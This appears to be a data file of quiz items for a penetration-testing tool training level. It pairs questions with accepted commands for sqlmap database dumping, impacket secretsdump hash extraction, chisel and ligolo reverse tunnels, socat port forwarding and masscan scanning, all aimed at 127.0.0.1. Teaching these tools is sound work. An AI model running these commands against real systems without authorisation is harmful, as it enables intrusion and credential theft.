name: pro
boss: operator
flavor: The kit real engagements run -- described here, never launched, because none of it has a safe stand-in.
brief: The one rule, always, said one more time because these are the
brief: sharpest tools on the stick: only ever aim them at a machine you own
brief: or have written permission to test. Every example here names
brief: ``127.0.0.1`` -- yourself -- as the target, even though on a real
brief: engagement the target is someone else's network. `sqlmap` and
brief: `impacket` attack a web app and a Windows network; `chisel`, `socat`,
brief: and `ligolo` tunnel through a firewall; `masscan` scans a whole range
brief: fast; `whois` looks up who owns an address. None of them run here --
brief: there is no safe local stand-in -- so know the invocation, and never
brief: point it anywhere but home.
---
q: find and dump the databases behind a sql injection at ``127.0.0.1``, with `sqlmap`
a: sh ~/tools/xexec -t ~/tools/python bin/python3 ~/tools/sqlmap/sqlmap.py -u 'http://127.0.0.1/item?id=1' --batch --dbs
a: python3 ~/tools/sqlmap/sqlmap.py -u 'http://127.0.0.1/item?id=1' --batch --dbs
ref: sqlmap
teach: sqlmap
hint: -u the vulnerable url, --batch answers every prompt itself, --dbs lists the databases it finds
---
q: dump the password hashes from a Windows host at ``127.0.0.1`` you already have creds for, with `impacket`'s `secretsdump.py`
a: sh ~/tools/xexec -t ~/tools/python bin/python3 ~/tools/impacket/secretsdump.py DOMAIN/user:pass@127.0.0.1
a: python3 ~/tools/impacket/secretsdump.py DOMAIN/user:pass@127.0.0.1
ref: impacket
teach: impacket
hint: secretsdump.py, then domain/user:pass@host -- 70 more scripts live in the same folder
---
q: stand up a `chisel` reverse-tunnel server on your own box, port 8080
a: chisel server -p 8080 --reverse
a: sh ~/tools/xexec chisel server -p 8080 --reverse
ref: chisel
teach: chisel
hint: server mode, -p the port it listens on, --reverse lets a client dial in from the far side
---
q: forward a `socat` listener on port 9000 to port 445 on ``127.0.0.1``
a: socat TCP-LISTEN:9000,fork TCP:127.0.0.1:445
a: socat TCP-LISTEN:9000,fork,reuseaddr TCP:127.0.0.1:445
a: sh ~/tools/xexec socat TCP-LISTEN:9000,fork TCP:127.0.0.1:445
ref: socat
teach: socat
hint: TCP-LISTEN with fork accepts more than one connection, then the destination host:port
---
q: start `ligolo-proxy`'s operator side with a self-signed cert
a: ligolo-proxy -selfcert
a: sh ~/tools/xexec ligolo-proxy -selfcert
ref: ligolo-proxy
teach: ligolo-proxy
hint: -selfcert skips needing a real certificate for the tunnel
---
q: connect `ligolo-agent` back to a proxy waiting on ``127.0.0.1``, port 11601
a: ligolo-agent -connect 127.0.0.1:11601
a: ligolo-agent -connect 127.0.0.1:11601 -ignore-cert
a: sh ~/tools/xexec ligolo-agent -connect 127.0.0.1:11601
ref: ligolo-agent
teach: ligolo-agent
hint: -connect host:port of the proxy; -ignore-cert matches its -selfcert
---
q: scan every port on ``127.0.0.1`` fast, with `masscan`
a: masscan -p1-65535 127.0.0.1 --rate 10000
a: sh ~/tools/xexec masscan -p1-65535 127.0.0.1 --rate 10000
ref: masscan
teach: masscan
hint: -p the port range, the address (or range) last, --rate packets per second
---
q: ask the public registry who owns ``127.0.0.1``, with `whois`
a: whois 127.0.0.1
a: sh ~/tools/xexec whois 127.0.0.1
ref: whois
teach: whois
hint: whois takes just the address (or domain) -- no flags needed
